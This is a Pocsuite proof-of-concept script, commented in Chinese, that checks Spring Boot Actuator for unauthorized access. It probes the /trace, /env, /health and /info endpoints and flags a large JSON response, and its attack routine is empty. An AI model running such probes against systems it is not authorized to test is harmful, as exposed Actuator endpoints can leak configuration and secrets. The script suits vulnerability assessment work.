#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests 
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase
#url转换host
from pocsuite.lib.utils.funs import url2ip

#基础基类
class ActuaorPOC(POCBase):
    vulID = '58'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2019-03-20' #漏洞公开的时间,不知道就写今天

    author = '1uanWu' #  PoC作者的大名
    createDate = '2019-03-20'# 编写 PoC 的日期
    updateDate = '2019-03-20'# PoC 更新的时间,默认和编写时间一样
    references = 'https://xz.aliyun.com/t/2233'# 漏洞地址来源,0day不用写
    name = 'springboot Actuaor Unauthorized access'# PoC 名称
    appPowerLink = 'https://docs.spring.io'# 漏洞厂商主页地址
    appName = 'springboot Actuaor'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'Information Disclosure'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        springboot actuaor 配置不当，未授权访问漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危" #严重,高危,中危,低危

    #指纹方法
    def _fingerprint(self):
        pass
        
    #验证模块 pocsuite -r 1-redis.py -u 10.1.5.26 --verify
    def _verify(self):
        #调用指纹方法
        result = {}
        output = Output()
        payload = ['trace','env','health','info']
        for i in payload:
            vul_url  = '{}/{}'.format(self.url, i)
            try:
                resp = req.get(url=vul_url, timeput=3, verify=False)
                if resp.headers['Content-Type'] and 'application/json' in resp.headers['Content-Type'] and len(resp.content)> 500:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['url'] = vul_url
                    result['VerifyInfo']['Payload'] = 'path:{}'.format(vul_url)
                    break
            except Exception as e:
                pass
        print '[+]58 poc done'
        return self.save_output(result)
    #攻击模块
    def _attack(self):
        pass

    #输出报告
    def save_output(self, result):
        output = Output()
        if result:
            output.success(result)
        else:
            output.fail()
        return output

#注册类
register(ActuaorPOC)


